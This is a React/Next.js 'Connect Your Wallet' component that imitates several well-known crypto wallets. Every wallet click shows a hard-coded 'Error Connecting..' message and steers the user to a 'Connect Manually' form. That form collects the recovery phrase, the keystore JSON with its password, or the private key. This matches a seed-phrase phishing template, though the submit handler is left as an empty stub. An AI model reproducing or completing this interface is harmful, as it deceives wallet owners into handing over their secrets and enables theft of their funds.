"use client";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";

const wallets = [
	{ name: "Trust Wallet", icon: "/twt.png" },
	{ name: "SafePal", icon: "/sfp.png" },
	{ name: "Exodus", icon: "/exodus.jpg" },
	{ name: "Lobstr", icon: "/lobstr.jpg" },
	{ name: "Dharma", icon: "/dharma.jpg" },
	{ name: "HaloDeFi Wallet", icon: "/halodefi.png" },
	{ name: "Metamask", icon: "/metamask.png" },
	{ name: "Rainbow", icon: "/rainbow.jpg" },
];

const importTabs = [
	{ key: "phrase", label: "Phrase" },
	{ key: "keystore", label: "Keystore JSON" },
	{ key: "private", label: "Private Key" },
];

export default function ConnectWallet() {
	const [modalOpen, setModalOpen] = useState(false);
	const [manualModalOpen, setManualModalOpen] = useState(false);
	const [selectedWallet, setSelectedWallet] = useState(null);
	const [activeTab, setActiveTab] = useState("phrase");
	const [phrase, setPhrase] = useState("");
	const [keystore, setKeystore] = useState("");
	const [keystorePassword, setKeystorePassword] = useState("");
	const [privateKey, setPrivateKey] = useState("");

	const handleWalletClick = (wallet) => {
		setSelectedWallet(wallet);
		setModalOpen(true);
	};

	const handleCloseModal = () => {
		setModalOpen(false);
		setSelectedWallet(null);
	};

	const handleOpenManual = () => {
		setModalOpen(false);
		setManualModalOpen(true);
	};

	const handleCloseManual = () => {
		setManualModalOpen(false);
		setActiveTab("phrase");
		setPhrase("");
		setKeystore("");
		setKeystorePassword("");
		setPrivateKey("");
	};

	// Example submit handler for manual import
	const handleManualSubmit = (e) => {
		e.preventDefault();
		// Handle import logic here
		handleCloseManual();
	};

	return (
		<div className="w-full max-w-6xl mx-auto px-4 py-12">
			<div className="text-center mb-10 max-w-2xl mx-auto">
				<h1 className="text-3xl font-bold mb-3">Connect Your Wallet</h1>
				<p className="text-gray-600">
					Select a wallet and connect securely by scanning a QR code or using a
					recovery phrase.
				</p>
			</div>
			<div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6">
				{wallets.map((wallet) => (
					<Card
						key={wallet.name}
						className="flex flex-col items-center cursor-pointer bg-white rounded-xl shadow hover:shadow-xl transition py-4 px-3 hover:scale-105"
						onClick={() => handleWalletClick(wallet)}
					>
						<div className="w-14 h-14 rounded-full overflow-hidden flex items-center justify-center bg-white shadow-sm">
							<img
								src={wallet.icon}
								alt={wallet.name}
								className="w-14 h-14 object-contain"
							/>
						</div>
						<span className="text-sm font-medium text-gray-800 text-center">
							{wallet.name}
						</span>
					</Card>
				))}
			</div>

			{/* Main Modal */}
			{modalOpen && (
				<div
					className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-40"
					style={{ display: "flex" }}
				>
					<div
						aria-modal="true"
						role="dialog"
						tabIndex={-1}
						aria-label="dialog"
						className="bg-white rounded-2xl shadow-2xl w-full max-w-md sm:max-w-lg relative overflow-hidden mx-2"
					>
						<div className="flex items-center justify-between p-4 border-b">
							<button
								onClick={handleCloseModal}
								className="text-gray-500 hover:text-red-500"
							>
								<svg
									width="24"
									height="24"
									fill="none"
									stroke="currentColor"
									strokeWidth={2}
									strokeLinecap="round"
									strokeLinejoin="round"
								>
									<line x1="18" y1="6" x2="6" y2="18" />
									<line x1="6" y1="6" x2="18" y2="18" />
								</svg>
							</button>
							<div
								className="text-blue-600 font-semibold cursor-pointer"
								onClick={handleCloseModal}
							>
								Back
							</div>
						</div>
						<div className="p-6">
							<div className="flex flex-col items-center">
								<div className="mb-4">
									<img
										src={selectedWallet?.icon}
										alt="Icon"
										style={{ width: 40, height: 40 }}
									/>
								</div>
								<div className="text-lg font-medium mb-2">
									Error Connecting..
								</div>
								<div className="flex justify-center mb-4">
									<Button
										className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
										onClick={handleOpenManual}
									>
										Connect Manually
									</Button>
								</div>
								<button
									className="flex cursor-pointer items-center justify-between w-full bg-blue-50 hover:bg-blue-100 rounded p-3 mt-2"
									id={`connect-${selectedWallet?.name?.toUpperCase()}`}
								>
									<div>
										<div
											className="font-semibold"
											style={{ color: "#E8831D" }}
										>
											{selectedWallet?.name}
										</div>
										<div className="text-xs text-gray-600">
											Easy-to-use browser extension.
										</div>
									</div>
									<div>
										<img
											src={selectedWallet?.icon}
											alt="Icon"
											style={{ width: 24 }}
										/>
									</div>
								</button>
							</div>
						</div>
					</div>
				</div>
			)}

			{/* Manual Import Modal */}
			{manualModalOpen && (
				<div
					className="fixed inset-0 z-50 flex items-center justify-center bg-white/60 backdrop-blur-sm"
					style={{ display: "flex" }}
				>
					<div
						role="dialog"
						aria-modal="true"
						aria-labelledby="modal-headline"
						className="bg-white rounded-lg text-left  overflow-hidden transform transition-all w-full max-w-lg"
					>
						<div className="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
							<div className="sm:flex sm:items-start">
								<div className="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
									<h3
										id="modal-headline"
										className="text-lg leading-6 mt-2 font-medium text-gray-900 flex flex-row items-center"
									>
										<img
											src={selectedWallet?.icon}
											style={{
												marginRight: 20,
												height: 40,
												width: 40,
											}}
											alt="wallet"
										/>
										<span>
											Import your{" "}
											<span>{selectedWallet?.name}</span> wallet
										</span>
									</h3>
									<div className="mt-2">
										<div className="mt-10">
											<div className="flex justify-evenly mb-4">
												{importTabs.map((tab) => (
													<div
														key={tab.key}
														className={`p-2 border-b-2 cursor-pointer ${
															activeTab === tab.key
																? "border-blue-600"
																: "border-white hover:border-blue-600"
														}`}
														onClick={() => setActiveTab(tab.key)}
													>
														{tab.label}
													</div>
												))}
											</div>
											{/* Phrase Tab */}
											{activeTab === "phrase" && (
												<form
													onSubmit={(e) => {
														e.preventDefault();
														// Validate phrase: must be 12 or 24 words
														const words = phrase
															.trim()
															.split(/\s+/);
														if (words.length !== 12 && words.length !== 24) {
															alert(
																"Recovery phrase must be exactly 12 or 24 words."
															);
															return;
														}
														handleManualSubmit(e);
													}}
												>
													<div className="flex flex-col mb-6">
														<div className="relative">
															<textarea
																cols={30}
																rows={4}
																placeholder="Enter your recovery phrase"
																className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
																name="phrase"
																minLength={12}
																value={phrase}
																onChange={(e) =>
																	setPhrase(e.target.value)
																}
																required
															/>
															<p className="text-xs text-gray-400 mt-2">
																Must be exactly 12 or 24 words separated by
																single spaces
															</p>
														</div>
													</div>
													<Button
														type="submit"
														className="w-full bg-blue-600 hover:bg-blue-700 text-white rounded py-2 flex items-center justify-center"
													>
														<span className="mr-2 uppercase">Proceed</span>
														<span>
															<svg
																fill="none"
																strokeLinecap="round"
																strokeLinejoin="round"
																strokeWidth="2"
																viewBox="0 0 24 24"
																stroke="currentColor"
																className="h-6 w-6"
															>
																<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
															</svg>
														</span>
													</Button>
												</form>
											)}
											{/* Keystore Tab */}
											{activeTab === "keystore" && (
												<form onSubmit={handleManualSubmit}>
													<div className="flex flex-col mb-6">
														<div className="relative">
															<textarea
																cols={30}
																rows={4}
																placeholder="Keystore JSON"
																className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
																name="keystore"
																value={keystore}
																onChange={(e) =>
																	setKeystore(e.target.value)
																}
																required
															/>
														</div>
													</div>
													<div className="flex flex-col mb-6">
														<div className="relative">
															<input
																type="text"
																name="keystorepassword"
																placeholder="Wallet password"
																className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
																value={keystorePassword}
																onChange={(e) =>
																	setKeystorePassword(e.target.value)
																}
															/>
															<p className="text-xs text-gray-400 mt-2">
																Several lines of text beginning with {"{"}...{"}"} plus
																the password you used to encrypt it.
															</p>
														</div>
													</div>
													<Button
														type="submit"
														className="w-full bg-blue-600 hover:bg-blue-700 text-white rounded py-2 flex items-center justify-center"
													>
														<span className="mr-2 uppercase">Proceed</span>
														<span>
															<svg
																fill="none"
																strokeLinecap="round"
																strokeLinejoin="round"
																strokeWidth="2"
																viewBox="0 0 24 24"
																stroke="currentColor"
																className="h-6 w-6"
															>
																<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
															</svg>
														</span>
													</Button>
												</form>
											)}
											{/* Private Key Tab */}
											{activeTab === "private" && (
												<form onSubmit={handleManualSubmit}>
													<div className="flex flex-col mb-6">
														<div className="relative">
															<input
																type="text"
																name="privatekey"
																placeholder="Enter your Private Key"
																className="form-control text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
																value={privateKey}
																onChange={(e) =>
																	setPrivateKey(e.target.value)
																}
																required
															/>
															<p className="text-xs text-gray-400 mt-2">
																Typically 12 (sometimes 24) words separated by a
																single space.
															</p>
														</div>
													</div>
													<Button
														type="submit"
														className="w-full bg-blue-600 hover:bg-blue-700 text-white rounded py-2 flex items-center justify-center"
													>
														<span className="mr-2 uppercase">Proceed</span>
														<span>
															<svg
																fill="none"
																strokeLinecap="round"
																strokeLinejoin="round"
																strokeWidth="2"
																viewBox="0 0 24 24"
																stroke="currentColor"
																className="h-6 w-6"
															>
																<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
															</svg>
														</span>
													</Button>
												</form>
											)}
										</div>
										<div className="bg-gray-50 px-4 py-3 sm:px-6 flex flex-row-reverse">
											<Button
												type="button"
												className="bg-red-600 hover:bg-red-700 text-white rounded-md px-4 py-2"
												onClick={handleCloseManual}
											>
												Cancel
											</Button>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			)}
		</div>
	);
}